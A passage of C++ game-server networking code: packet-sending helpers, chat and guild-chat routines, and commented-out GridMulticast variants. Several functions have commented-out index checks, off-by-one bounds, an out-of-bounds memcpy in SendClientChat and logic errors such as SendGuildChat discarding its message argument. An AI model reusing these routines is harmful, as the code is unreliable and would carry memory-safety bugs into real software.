		int Size = sm_mbo.Size;

		if (Size > sizeof(MSG_MessageBoxOk))
		{
			sm_mbo.Size = 0;
			return;
		}
		if (!pUser[conn].cSock.AddMessage((char*)&sm_mbo, sizeof(MSG_MessageBoxOk)))
			CloseUser(conn);
	}
}

void SendClientSignal(int conn, int id, unsigned short signal)
{
	MSG_STANDARD sm;
	memset(&sm, 0, sizeof(MSG_STANDARD));

	sm.Type = signal;
	sm.ID = id;

	int Size = sm.Size;

	if (Size > sizeof(MSG_STANDARD))
	{
		sm.Size = 0;
		return;
	}
	if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(sm)))
		CloseUser(conn);
}

void SendClientSignalParm(int conn, int id, unsigned short signal, int parm)
{

	//18/12
	/*if (conn <= 0 || conn >= MAX_USER)
		return;*/

	MSG_STANDARDPARM sm;
	memset(&sm, 0, sizeof(MSG_STANDARDPARM));

	sm.Type = signal;
	sm.ID = id;
	sm.Parm = parm;

	int Size = sm.Size;

	if (Size > sizeof(MSG_STANDARDPARM))
	{
		sm.Size = 0;
		return;
	}
	if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(sm)))
		CloseUser(conn);
}

void SendClientSignalParm2(int conn, int id, unsigned short signal, int parm, int parm2)
{
	/*if (conn <= 0 || conn >= MAX_USER)
		return;*/

	MSG_STANDARDPARM2 sm;
	memset(&sm, 0, sizeof(MSG_STANDARDPARM2));

	sm.Type = signal;
	sm.ID = id;
	sm.Parm1 = parm;
	sm.Parm2 = parm2;

	int Size = sm.Size;

	if (Size > sizeof(MSG_STANDARDPARM2))
	{
		sm.Size = 0;
		return;
	}
	if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(sm)))
		CloseUser(conn);
}

void SendClientSignalParm3(int conn, int id, unsigned short signal, int parm, int parm2, int parm3)
{

	//18/12
	/*if (conn <= 0 || conn >= MAX_USER)
		return;*/

	MSG_STANDARDPARM3 sm;
	memset(&sm, 0, sizeof(MSG_STANDARDPARM3));

	sm.Type = signal;
	sm.ID = id;
	sm.Parm1 = parm;
	sm.Parm2 = parm2;
	sm.Parm3 = parm3;

	int Size = sm.Size;

	if (Size > sizeof(MSG_STANDARDPARM3))
	{
		sm.Size = 0;
		return;
	}
	if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(sm)))
		CloseUser(conn);
}

void SendClientSignalShortParm2(int conn, int id, unsigned short signal, int parm, int parm2)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_STANDARDSHORTPARM2 sm;
	memset(&sm, 0, sizeof(MSG_STANDARDSHORTPARM2));

	sm.Type = signal;
	sm.ID = id;
	sm.Parm1 = parm;
	sm.Parm2 = parm2;

	int Size = sm.Size;

	if (Size > sizeof(MSG_STANDARDSHORTPARM2))
	{
		sm.Size = 0;
		return;
	}
	if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(sm)))
		CloseUser(conn);
}

void SyncMulticast(int conn, MSG_STANDARD *m, int bSend)
{
	for (int i = 1; i < MAX_USER; i++)
	{
		if (pUser[i].Mode == USER_PLAY && conn != i)
		{
			if (!pUser[i].cSock.AddMessage((char*)m, m->Size))
				CloseUser(conn);

			if (bSend)
				pUser[i].cSock.SendMessageA();
		}
	}
}

void SyncKingdomMulticast(int conn, int Kingdom, MSG_STANDARD *m, int bSend)
{
	for (int i = 0; i < MAX_USER; i++)
	{
		if (pUser[i].Mode == USER_PLAY && conn != i && pMob[i].MOB.Clan == Kingdom && pUser[i].KingChat == 0)
		{
			if (!pUser[i].cSock.AddMessage((char*)m, m->Size))
				CloseUser(conn);

			if (bSend)
				pUser[i].cSock.SendMessageA();
		}
	}
}

void SendCreateMob(int conn, int otherconn, int bSend)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)//18/12
		return;

	if (!pUser[conn].cSock.Sock)//18/12
		return;

	MSG_CreateMob sm;
	memset(&sm, 0, sizeof(MSG_CreateMob));
	MSG_CreateMobTrade sm2;
	memset(&sm2, 0, sizeof(MSG_CreateMobTrade));

	if (otherconn <= 0 || otherconn >= MAX_USER || pUser[otherconn].TradeMode != 1)
	{
		GetCreateMob(otherconn, &sm);

		if (!pUser[conn].cSock.SendOneMessage((char*)&sm, sizeof(MSG_CreateMob)))
			CloseUser(conn);

		return;
	}

	GetCreateMobTrade(otherconn, &sm2);

	if (!pUser[conn].cSock.SendOneMessage((char*)&sm2, sizeof(MSG_CreateMobTrade)))
		CloseUser(conn);
}

void SendCreateItem(int conn, int item, int bSend)
{

	//18/12

	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;


	MSG_CreateItem sm;
	memset(&sm, 0, sizeof(MSG_CreateItem));

	GetCreateItem(item, &sm);

	if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(MSG_CreateItem)))

	if (bSend)
		pUser[conn].cSock.SendMessageA();
}

void SendChat(int conn, char *Message)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;


	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_MessageChat sm;
	memset(&sm, 0, sizeof(MSG_MessageChat));

	sm.Type = _MSG_MessageChat;
	sm.Size = sizeof(MSG_MessageChat);
	sm.ID = conn;
	sm.Size = sizeof(MSG_MessageChat);

	memcpy(sm.String, Message, MESSAGE_LENGTH);

	GridMulticast(pMob[conn].TargetX, pMob[conn].TargetY, (MSG_STANDARD*)&sm, conn);
}

void SendClientChat(int conn, char *pMsg, int color)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;


	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_MagicTrumpet m;
	m.Type = 0xD1E;
	m.ID = 0x7530;
	strncpy_s(m.String, pMsg, sizeof(m.String));

	char buffer[sizeof MSG_MagicTrumpet + 4];
	memcpy(&buffer, &m, sizeof buffer);
	*(int*)&buffer[108] = color;
	DBServerSocket.SendOneMessage((char*)&m, sizeof(MSG_MagicTrumpet));
}

void SendGuildChat(int conn, char *Message)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_MessageWhisper m;
	memset(&m, 0, sizeof(MSG_MessageWhisper));

	m.Type = _MSG_MessageWhisper;
	m.Size = sizeof(MSG_MessageWhisper);
	m.ID = conn;

	Message = m.String;

	strncpy(m.MobName, pMob[conn].MOB.MobName, NAME_LENGTH);

	m.String[MESSAGE_LENGTH] = 3;

	int guild = pMob[conn].MOB.Guild;

	if (guild == 0)
	{
		SendClientMessage(conn, g_pMessageStringTable[_NN_Only_Guild_Member_Can]);
		return;
	}

	int guildlevel = pMob[conn].MOB.GuildLevel;
	for (int i = 1; i < MAX_USER; i++)
	{
		if (pUser[i].Mode != USER_PLAY)
			continue;

		if (pMob[i].MOB.Guild != guild && m.String[1] != '-')
			continue;

		if (pMob[i].MOB.Guild != guild && m.String[1] == '-' && (pMob[i].MOB.Guild != g_pGuildAlly[guild] || g_pGuildAlly[guild] == 0))
			continue;

		if (i == conn)
			continue;

		if (pUser[i].Guildchat)
			continue;

		m.ID = conn;
		if (!pUser[i].cSock.AddMessage((char*)&m, sizeof(MSG_MessageWhisper)))
			CloseUser(conn);
	}

	char guildname[256];
	BASE_GetGuildName(ServerGroup, guild, guildname);

	sprintf_s(temp, "chat_guild, %s : %s guild:%s", m.MobName, m.String, guildname);
	ChatLog(pUser[conn].AccountName, pUser[conn].MacAddress, pUser[conn].IP, temp);
	return;
}

void SendEnvEffect(int x1, int y1, int x2, int y2, int Effect, int EffectParm)
{
	MSG_EnvEffect sm;
	memset(&sm, 0, sizeof(MSG_EnvEffect));

	sm.Type = _MSG_EnvEffect;
	sm.Size = sizeof(MSG_EnvEffect);
	sm.ID = ESCENE_FIELD;
	sm.Size = sizeof(MSG_EnvEffect);

	sm.x1 = x1;
	sm.y1 = y1;
	sm.x2 = x2;
	sm.y2 = y2;

	sm.Effect = Effect;
	sm.EffectParm = EffectParm;

	/*
	for(int x = x1; x < x2; x++)
	{
	for(int y = y1; y < y2; y++)
	{
	if(x < 0 || x >= MAX_GRIDX || y < 0 || y >= MAX_GRIDY)
	continue;

	if(pMobGrid[y][x] == 0)
	continue;

	if(pMobGrid[y][x] >= MAX_USER)
	continue;

	pUser[pMobGrid[y][x]].cSock.AddMessage((char*)&sm, sizeof(MSG_EnvEffect));
	}
	}*/

	GridMulticast(x1 + ((x2 - x1) / 2), y1 + ((y2 - y1) / 2), (MSG_STANDARD*)&sm, 0);
}

void SendEnvEffectKingdom(int x1, int y1, int x2, int y2, int Effect, int EffectParm, int Clan)
{
	MSG_EnvEffect sm;
	memset(&sm, 0, sizeof(MSG_EnvEffect));

	sm.Type = _MSG_EnvEffect;
	sm.Size = sizeof(MSG_EnvEffect);
	sm.ID = ESCENE_FIELD;
	sm.Size = sizeof(MSG_EnvEffect);

	sm.x1 = x1;
	sm.y1 = y1;
	sm.x2 = x2;
	sm.y2 = y2;

	sm.Effect = Effect;
	sm.EffectParm = EffectParm;

	int HaveUser = 0;

	for (int x = x1; x < x2; x++)
	{
		for (int y = y1; y < y2; y++)
		{
			if (x < 0 || x >= MAX_GRIDX || y < 0 || y >= MAX_GRIDY)
				continue;

			if (pMobGrid[y][x] == 0)
				continue;

			if (pMobGrid[y][x] >= MAX_USER)
				continue;

			int tmob = pMobGrid[y][x];

			if (pMob[tmob].MOB.Clan == Clan)
				continue;

			HaveUser++;
		}
	}

	if (HaveUser)
		GridMulticast(x1 + ((x2 - x1) / 2), y1 + ((y2 - y1) / 2), (MSG_STANDARD*)&sm, 0);
}

void SendEnvEffectLeader(int x1, int y1, int x2, int y2, int Effect, int EffectParm)
{
	MSG_EnvEffect sm;
	memset(&sm, 0, sizeof(MSG_EnvEffect));

	sm.Type = _MSG_EnvEffect;
	sm.Size = sizeof(MSG_EnvEffect);
	sm.ID = ESCENE_FIELD;
	sm.Size = sizeof(MSG_EnvEffect);

	sm.x1 = x1;
	sm.y1 = y1;
	sm.x2 = x2;
	sm.y2 = y2;

	sm.Effect = Effect;
	sm.EffectParm = EffectParm;

	int HaveUser = 0;
	int bSend = 0;

	for (int x = x1; x < x2; x++)
	{
		for (int y = y1; y < y2; y++)
		{
			if (x < 0 || x >= MAX_GRIDX || y < 0 || y >= MAX_GRIDY)
				continue;

			if (pMobGrid[y][x] == 0)
				continue;

			if (pMobGrid[y][x] >= MAX_USER)
				continue;

			int tmob = pMobGrid[y][x];

			if (tmob == Pista[4].Party[0].LeaderID)
			{
				HaveUser++;
				continue;
			}

			if (tmob == Pista[4].Party[1].LeaderID)
			{
				HaveUser++;
				continue;
			}
			if (tmob == Pista[4].Party[1].LeaderID)
			{
				HaveUser++;
				continue;
			}

			bSend++;
		}
	}

	if (HaveUser == 0 && bSend)
		GridMulticast(x1 + ((x2 - x1) / 2), y1 + ((y2 - y1) / 2), (MSG_STANDARD*)&sm, 0);
}

void SendRemoveMob(int dest, int sour, int Type, int bSend)
{

	if (dest <= 0 || dest > MAX_USER)
		return;

	MSG_RemoveMob sm;
	memset(&sm, 0, sizeof(MSG_RemoveMob));

	sm.Type = _MSG_RemoveMob;
	sm.Size = sizeof(MSG_RemoveMob);
	sm.ID = sour;
	sm.RemoveType = Type;

	if (!pUser[dest].cSock.AddMessage((char*)&sm, sizeof(MSG_RemoveMob)))		
		CloseUser(dest);

	if (bSend)
		pUser[dest].cSock.SendMessageA();
}

void SendRemoveItem(int dest, int itemid, int bSend)
{

	if (dest <= 0 || dest > MAX_USER)
		return;

	MSG_DecayItem sm_deci;
	memset(&sm_deci, 0, sizeof(MSG_DecayItem));

	sm_deci.Type = _MSG_DecayItem;
	sm_deci.Size = sizeof(MSG_DecayItem);
	sm_deci.ID = ESCENE_FIELD;
	sm_deci.ItemID = 10000 + itemid;
	sm_deci.unk = 0;

	if (!pUser[dest].cSock.AddMessage((char*)&sm_deci, sizeof(MSG_DecayItem)))
		CloseUser(dest);

	if (bSend)
		pUser[dest].cSock.SendMessageA();
}

//int RemoveItem(int a_iMob, int a_iObject, int a_iCount)
//{
//	if (a_iCount < TRUE) a_iCount = TRUE;
//
//	int FindCount = 0;
//
//	int ProcSlot = -1;
//
//	for (int i = 0; i < pMob[a_iMob].MaxCarry; i++)
//	{
//		if (pMob[a_iMob].MOB.Carry[i].sIndex == 0)
//		{
//			ProcSlot = i;
//
//			break;
//		}
//	}
//
//	if (ProcSlot == -1)
//	{
//		SendClientMessage(a_iMob, g_pMessageStringTable[_NN_You_Have_No_Space_To_Trade]);
//
//		return FALSE;
//	}
//
//	for (int i = 0; i < pMob[a_iMob].MaxCarry; i++)
//	{
//		if (pMob[a_iMob].MOB.Carry[i].sIndex != a_iObject) continue;
//
//		int byCount = BASE_GetItemAmount(&pMob[a_iMob].MOB.Carry[i]);
//
//		if (byCount == FALSE) byCount = TRUE;
//
//		FindCount += byCount;
//	}
//
//	if (FindCount < a_iCount) return FALSE; int RemoveCount = a_iCount;
//
//	for (int i = 0; i < pMob[a_iMob].MaxCarry && RemoveCount > FALSE; i++)
//	{
//		if (pMob[a_iMob].MOB.Carry[i].sIndex != a_iObject) continue;
//
//		int byCount = BASE_GetItemAmount(&pMob[a_iMob].MOB.Carry[i]);
//
//		if (byCount == FALSE) byCount = TRUE;
//
//		if (byCount > RemoveCount)
//		{
//			byCount -= RemoveCount;
//
//			BASE_SetItemAmount(&pMob[a_iMob].MOB.Carry[i], byCount); SendItem(a_iMob, ITEM_PLACE_CARRY, i, &pMob[a_iMob].MOB.Carry[i]);
//
//			return TRUE;
//		}
//
//		RemoveCount -= byCount;
//
//		memset(&pMob[a_iMob].MOB.Carry[i], 0, sizeof(STRUCT_ITEM)); SendItem(a_iMob, ITEM_PLACE_CARRY, i, &pMob[a_iMob].MOB.Carry[i]);
//	}
//
//	return TRUE;
//}

void SendAutoTrade(int conn, int otherconn)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (otherconn <= 0 || otherconn >= MAX_USER)
		return;

	if (pUser[otherconn].TradeMode == 0)
		return;

	if (pUser[otherconn].Mode != USER_PLAY)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	MSG_SendAutoTrade sm;
	memset(&sm, 0, sizeof(MSG_SendAutoTrade));

	memcpy(&sm, &pUser[otherconn].AutoTrade, sizeof(MSG_SendAutoTrade));

	sm.ID = ESCENE_FIELD;

	sm.Index = otherconn;

	sm.Type = _MSG_SendAutoTrade;
	sm.Size = sizeof(MSG_SendAutoTrade);

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
	{
		if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(MSG_SendAutoTrade)))
			CloseUser(conn);
	}
}

void SendGridMob(int conn)
{
	int posX = pMob[conn].TargetX;
	int posY = pMob[conn].TargetY;

	if (conn <= 0 || conn >= MAX_USER)
		return;

	int SizeY = VIEWGRIDY;
	int SizeX = VIEWGRIDX;
	int StartX = posX - HALFGRIDX;
	int StartY = posY - HALFGRIDY;

	if ((posX - HALFGRIDX + VIEWGRIDX) >= MAX_GRIDX)
		SizeX -= (StartX + SizeX - MAX_GRIDX);

	if ((posY - HALFGRIDY + VIEWGRIDY) >= MAX_GRIDY)
		SizeY -= (StartY + SizeY - MAX_GRIDY);

	if (StartX < 0)
		StartX = 0;

	if (StartY < 0)
		StartY = 0;


	int sx1 = StartX;
	int sy1 = StartY;
	int sx2 = StartX + SizeX;
	int sy2 = StartY + SizeY;

	for (int y = sy1; y < sy2; y++)
	{
		for (int x = sx1; x < sx2; x++)
		{
			int tmob = pMobGrid[y][x];
			int titem = pItemGrid[y][x];

			if (tmob > 0 && tmob < MAX_MOB && tmob != conn)
			{
				if (pMob[tmob].Mode == MOB_EMPTY)
					pMobGrid[y][x] = 0; // Testar 1
				else
				{
					SendCreateMob(conn, tmob, 0);
					SendPKInfo(conn, tmob);
				}
			}

			if (titem > 0 && titem < MAX_ITEM)
			{
				if (pItem[titem].Mode)
					SendCreateItem(conn, titem, 0);
				else
					pItemGrid[y][x] = 0;
			}
		}
	}
}

/*
void GridMulticast(int conn, int tx, int ty, MSG_STANDARD *msg)
{
int tmob; // [sp+54h] [bp-14Ch]@61
int titem; // [sp+58h] [bp-148h]@61
int k; // [sp+5Ch] [bp-144h]@58
int j; // [sp+64h] [bp-13Ch]@32
int i; // [sp+68h] [bp-138h]@30
int ty2; // [sp+70h] [bp-130h]@30
int tx2; // [sp+74h] [bp-12Ch]@30
int ty1; // [sp+78h] [bp-128h]@30
int tx1; // [sp+7Ch] [bp-124h]@30
int sy2; // [sp+80h] [bp-120h]@22
int sx2; // [sp+84h] [bp-11Ch]@22
int sy1; // [sp+88h] [bp-118h]@22
int sx1; // [sp+8Ch] [bp-114h]@22
int StartY; // [sp+90h] [bp-110h]@14
int StartX; // [sp+94h] [bp-10Ch]@14
int SizeY; // [sp+98h] [bp-108h]@14
int SizeX; // [sp+9Ch] [bp-104h]@14

if (conn && pMob[conn].TargetX)
{
tmob = pMobGrid[pMob[conn].TargetY][pMob[conn].TargetX];

if (tmob != conn && tmob)
{
if (conn < MAX_USER)
Log("PC do not have his own grid", "-system", 0);
else
Log("NPC do not have his own grid", "-system", 0);
}

pMobGrid[pMob[conn].TargetY][pMob[conn].TargetX] = 0;

if (pMobGrid[ty][tx] != conn && pMobGrid[ty][tx])
{
if (conn < MAX_USER)
Log("PC step in other mob's grid", "-system", 0);
else
Log("NPC charge other mob's grid", "-system", 0);
}

pMobGrid[ty][tx] = conn;
SizeY = VIEWGRIDY;
SizeX = VIEWGRIDX;
StartX = pMob[conn].TargetX - HALFGRIDX;
StartY = pMob[conn].TargetY - HALFGRIDY;

if (StartX + VIEWGRIDX >= MAX_GRIDX)
SizeX -= StartX + SizeX - MAX_GRIDX;

if (SizeY + StartY >= MAX_GRIDY)
SizeY -= StartY + SizeY - MAX_GRIDY;

if (StartX < 0)
StartX = 0;

if (StartY < 0)
StartY = 0;

sx1 = StartX;
sy1 = StartY;
sx2 = SizeX + StartX;
sy2 = SizeY + StartY;

SizeY = VIEWGRIDY;
SizeX = VIEWGRIDX;

StartX = tx - VIEWGRIDX;
StartY = ty - VIEWGRIDY;

if (tx - 16 + 33 >= MAX_GRIDX)
SizeX -= StartX + SizeX - MAX_GRIDX;

if (SizeY + StartY >= MAX_GRIDY)
SizeY -= StartY + SizeY - MAX_GRIDY;

if (StartX < 0)
StartX = 0;

if (StartY < 0)
StartY = 0;

tx1 = StartX;
ty1 = StartY;
tx2 = SizeX + StartX;
ty2 = SizeY + StartY;

for (i = sy1; i < sy2; ++i)
{
for (j = sx1; j < sx2; ++j)
{
tmob = pMobGrid[i][j];

if (tmob && tmob != conn)
{
if (pMob[tmob].Mode)
{
if (msg && tmob < MAX_USER)
pUser[tmob].cSock.AddMessage((char*)msg, msg->Size);

if ((j < tx1 || j >= tx2 || i < ty1 || i >= ty2) && tx)
{
if (tmob < MAX_USER)
SendRemoveMob(tmob, conn, 0, 0);

if (conn < MAX_USER)
SendRemoveMob(conn, tmob, 0, 0);
}
}
else
{
Log("Dest Empty grid", "-system", 0);
pMobGrid[i][j] = 0;
}
}
}
}

for (i = ty1; i < ty2; ++i)
{
for (k = tx1; k < tx2; ++k)
{
titem = pItemGrid[i][k];
tmob = pMobGrid[i][k];

if (k < sx1 || k >= sx2 || i < sy1 || i >= sy2)
{
if (titem > 0 && titem < MAX_ITEM && pItem[titem].Mode && pItem[titem].ITEM.sIndex && conn < MAX_USER)
{
if (pItem[titem].Mode)
SendCreateItem(conn, titem, 0);

else
pItemGrid[i][k] = 0;
}

if (tmob != conn && tmob)
{
if (pMob[tmob].Mode)
{
if (tmob < MAX_USER)
{
if (pMob[conn].Mode)
SendCreateMob(tmob, conn, 0);

else
pMobGrid[i][k] = 0;
}

if (conn < MAX_USER)
{
if (pMob[tmob].Mode)
SendCreateMob(conn, tmob, 0);

else
pMobGrid[i][k] = 0;
}

if (msg && tmob > 0 && tmob < MAX_USER)
{
if (pMob[tmob].Mode == 22)
{
if (!pUser[tmob].cSock.AddMessage((char*)msg, msg->Size))
{
pUser[tmob].AccountName[ACCOUNTNAME_LENGTH - 1] = 0;
pUser[tmob].AccountName[ACCOUNTNAME_LENGTH - 2] = 0;
sprintf(temp, "err,gridmulticast add %d-%d %s", tmob, pUser[tmob].Mode, pUser[tmob].AccountName);
Log(temp, "-system", 0);
pMobGrid[i][k] = 0;
CloseUser(tmob);
}
}
else
{
pUser[tmob].AccountName[ACCOUNTNAME_LENGTH - 1] = 0;
pUser[tmob].AccountName[ACCOUNTNAME_LENGTH - 2] = 0;
sprintf(temp, "err,grid-1 empty %d-%d %s", tmob, pUser[tmob].Mode, pUser[tmob].AccountName);
Log(temp, "-system", 0);
pMobGrid[i][k] = 0;
CloseUser(tmob);
}
}
}
else
{
pMobGrid[i][k] = 0;
Log("MOB GRID HAS EMPTY MOB", "-system", 0);
}
}
}
}
}

if (pUser[conn].Mode == USER_PLAY)
{
if (pMobGrid[pMob[conn].TargetY][pMob[conn].TargetX] == 0 || pMobGrid[pMob[conn].TargetY][pMob[conn].TargetX] != conn)
Log("USER PLAYING WITH MOBGRID OFFLINE", "-system", 0);
}

MSG_Action *sm = (MSG_Action*)msg;

pMob[conn].LastTime = sm->ClientTick;
pMob[conn].LastSpeed = sm->Speed;
pMob[conn].LastX = sm->PosX;
pMob[conn].LastY = sm->PosY;
pMob[conn].TargetX = tx;
pMob[conn].TargetY = ty;

}
else
Log("err,GridMulticast mobidx,pos", "-system", 0);

return;
}
*/
/*
void GridMulticast(int conn, int tx, int ty, MSG_STANDARD *msg)
{
int SizeX, SizeY, StartX, StartY;
int sx1, sy1, sx2, sy2;        // Source Rect
int dx1, dy1, dx2, dy2;		   // Dest Rect

if (conn == 0 || pMob[conn].TargetX == 0)
{
Log("err GridMulticast mobidx,pos","-system", 0);
return;
}

int mobx = pMob[conn].TargetX;
int moby = pMob[conn].TargetY;

if (mobx < 0 || mobx >= MAX_GRIDX || moby < 0 || moby >= MAX_GRIDY)
return;

int currentgrid = pMobGrid[moby][mobx];

if (currentgrid != conn && currentgrid != 0)
{
if (conn >= MAX_USER)
Log("NPC do not have his own grid","-system",0);
else
Log("PC do not have his own grid","-system",0);

pMobGrid[moby][mobx] = 0;

}
else
pMobGrid[moby][mobx] = 0;

if  (pMobGrid[ty][tx] != conn && pMobGrid[ty][tx] != 0)
{
if (conn >= MAX_USER)
Log("NPC charge other mob's grid","-system",0);
else
Log("PC step in other mob's grid","-system",0);

pMobGrid[ty][tx] = conn;
}
else
pMobGrid[ty][tx] = conn;

SizeY  = VIEWGRIDY;
SizeX  = VIEWGRIDX;
StartX = pMob[conn].TargetX - HALFGRIDX;
StartY = pMob[conn].TargetY - HALFGRIDY;

if  (StartX+SizeX >= MAX_GRIDX)
SizeX = SizeX - (StartX + SizeX - MAX_GRIDX);

if  (StartY+SizeY >= MAX_GRIDY)
SizeY = SizeY - (StartY + SizeY - MAX_GRIDY);

if  (StartX < 0)
{
StartX = 0;
SizeX = SizeX + StartX;
}

if  (StartY < 0)
{
StartY = 0;
SizeY = SizeY + StartY;
}

sx1 = StartX;
sy1 = StartY;
sx2 = StartX + SizeX;
sy2 = StartY + SizeY;

SizeY  = VIEWGRIDY;
SizeX  = VIEWGRIDX;
StartX = tx - HALFGRIDX;
StartY = ty - HALFGRIDY;

if  (StartX + SizeX >= MAX_GRIDX)
SizeX = SizeX - (StartX + SizeX - MAX_GRIDX);

if  (StartY+SizeY >= MAX_GRIDY)
SizeY = SizeY - (StartY + SizeY - MAX_GRIDY);

if  (StartX < 0)
{
StartX = 0;
SizeX = SizeX + StartX;
}

if  (StartY < 0)
{
StartY = 0;
SizeY = SizeY + StartY;
}

dx1 = StartX;
dy1 = StartY;
dx2 = StartX + SizeX;
dy2 = StartY + SizeY;

for (int y = sy1; y < sy2; y++)
{
for (int x = sx1; x < sx2; x++)
{
int tmob = pMobGrid[y][x];

if (tmob == 0 || tmob == conn)
continue;

if  (msg && tmob < MAX_USER)
pUser[tmob].cSock.AddMessage((char*)msg, msg->Size);

if	((x < dx1 || x >= dx2 || y < dy1 || y >= dy2) && tx != 0)
{
if	(tmob < MAX_USER)
SendRemoveMob(tmob, conn, 0, 0);

if (conn < MAX_USER)
SendRemoveMob(conn, tmob, 0, 0);
}
}
}

for (int y = sy1; y < sy2; y++)
{
for (int x = sx1; x < sx2; x++)
{
int titem = pItemGrid[y][x];

if (titem == 0)
continue;

if (x < dx1 || x >= dx2 || y < dy1 || y >= dy2 && tx)
{
if (titem > 0 && titem < MAX_ITEM && pItem[titem].Mode && pItem[titem].ITEM.sIndex && conn > 0 && conn < MAX_USER)
SendRemoveItem(conn, titem, 0);
}
}
}

pMob[conn].TargetX = tx;
pMob[conn].TargetY = ty;

for (int y = dy1; y < dy2; y++)
{
for (int x = dx1; x < dx2; x++)
{
int titem = pItemGrid[y][x];
int tmob  = pMobGrid[y][x];

if  (x < sx1 || x >= sx2 || y < sy1 || y >= sy2)
{
if  (titem > 0 && titem < MAX_ITEM && pItem[titem].Mode != 0 && pItem[titem].ITEM.sIndex != 0 && conn < MAX_USER)
{
if (pItem[titem].Mode == 0)
pItemGrid[y][x] = 0;
else
SendCreateItem(conn, titem, FALSE);
}

if (tmob == conn || tmob == 0)
continue;

if (pMob[tmob].Mode == MOB_EMPTY)
{
pMobGrid[y][x] = 0;
Log("MOB GRID HAS EMPTY MOB","-system",0);
continue;
}

if (tmob < MAX_USER)
{
if (pMob[conn].Mode == MOB_EMPTY)
pMobGrid[y][x] = 0;
else
SendCreateMob(tmob, conn, FALSE);
}

if (conn < MAX_USER)
{
if (pMob[tmob].Mode == MOB_EMPTY)
pMobGrid[y][x] = 0;
else
SendCreateMob(conn, tmob, FALSE);
}

if (conn < MAX_USER)
{
if (pUser[conn].Mode == USER_PLAY)
pMobGrid[pMob[conn].TargetY][pMob[conn].TargetX] = pMobGrid[pMob[conn].TargetY][pMob[conn].TargetX] == 0 ? conn : conn;
}

if (msg && tmob < MAX_USER)
pUser[tmob].cSock.AddMessage((char*)msg, msg->Size);


}
}
}

MSG_Action * act    = (MSG_Action*)msg;
pMob[conn].LastTime  = act->ClientTick;
pMob[conn].LastSpeed = act->Speed;
pMob[conn].LastX     = act->PosX;
pMob[conn].LastY     = act->PosY;
pMob[conn].TargetX = tx;
pMob[conn].TargetY = ty;
}*/

//void GridMulticast(int conn, int tx, int ty, MSG_STANDARD *msg)
//{
//	if (conn == 0 || pMob[conn].TargetX == 0)
//	{
//		SystemLog("-system", "-", 0, "err,GridMulticast mobidx,pos");
//
//		return;
//	}
//
//	int tmob = pMobGrid[pMob[conn].TargetY][pMob[conn].TargetX];
//
//	if (tmob != conn && tmob)
//		GetEmptyMobGrid(conn, &pMob[conn].TargetX, &pMob[conn].TargetY);
//
//	if (tmob != conn && tmob)
//	{
//		if (conn < MAX_USER)
//			SystemLog("-system", "-", 0, "PC do not have his own grid");
//
//		else
//		{
//			/*char tmg[256];
//			snprintf(tmg, sizeof(tmg), "NPC %s do not have his own grid", pMob[conn].MOB.MobName);
//			SystemLog("-system", "-", 0, tmg);*/
//		}
//
//	}
//
//	pMobGrid[pMob[conn].TargetY][pMob[conn].TargetX] = 0;
//
//	if (pMobGrid[ty][tx] != conn && pMobGrid[ty][tx] != 0)
//		GetEmptyMobGrid(conn, &pMob[conn].TargetX, &pMob[conn].TargetY);
//
//	if (pMobGrid[ty][tx] != conn && pMobGrid[ty][tx] != 0)
//	{
//		if (conn < MAX_USER)
//			SystemLog("-system", "-", 0, "PC step in other mob's grid");
//
//		else
//		{
//			/*	char tmg[256];
//			snprintf(tmg, sizeof(tmg), "NPC %s charge other mob's grid", pMob[conn].MOB.MobName);
//			SystemLog("-system", "-", 0, tmg);*/
//		}
//	}
//
//	pMobGrid[ty][tx] = conn;
//
//	int SizeY = VIEWGRIDY;
//	int SizeX = VIEWGRIDX;
//	int StartX = pMob[conn].TargetX - HALFGRIDX;
//	int StartY = pMob[conn].TargetY - HALFGRIDY;
//
//	if (StartX + SizeX >= MAX_GRIDX)
//		SizeX = SizeX - (StartX + SizeX - MAX_GRIDX);
//
//	if (SizeY + StartY >= MAX_GRIDY)
//		SizeY = SizeY - (StartY + SizeY - MAX_GRIDY);
//
//	if (StartX < 0)
//		StartX = 0;
//
//	if (StartY < 0)
//		StartY = 0;
//
//	int sx1 = StartX;
//	int sy1 = StartY;
//	int sx2 = StartX + SizeX;
//	int sy2 = StartY + SizeY;
//
//
//	SizeY = VIEWGRIDY;
//	SizeX = VIEWGRIDX;
//	StartX = tx - HALFGRIDX;
//	StartY = ty - HALFGRIDY;
//
//	if (StartX + SizeX >= MAX_GRIDX)
//		SizeX = SizeX - (StartX + SizeX - MAX_GRIDX);
//
//	if (SizeY + StartY >= MAX_GRIDY)
//		SizeY = SizeY - (StartY + SizeY - MAX_GRIDY);
//
//	if (StartX < 0)
//		StartX = 0;
//
//	if (StartY < 0)
//		StartY = 0;
//
//	int tx1 = StartX;
//	int ty1 = StartY;
//	int tx2 = StartX + SizeX;
//	int ty2 = StartY + SizeY;
//
//	for (int y = sy1; y < sy2; y++)
//	{
//		for (int x = sx1; x < sx2; x++)
//		{
//			tmob = pMobGrid[y][x];
//
//			if (tmob == 0 || tmob == conn)
//				continue;
//
//			if (msg != NULL && tmob < MAX_USER)
//				pUser[tmob].cSock.AddMessage((char*)msg, msg->Size);
//
//			if (x < tx1 || x >= tx2 || y < ty1 || y >= ty2 && tx)
//			{
//				if (tmob < MAX_USER)
//					SendRemoveMob(tmob, conn, 0, 0);
//
//				if (conn < MAX_USER)
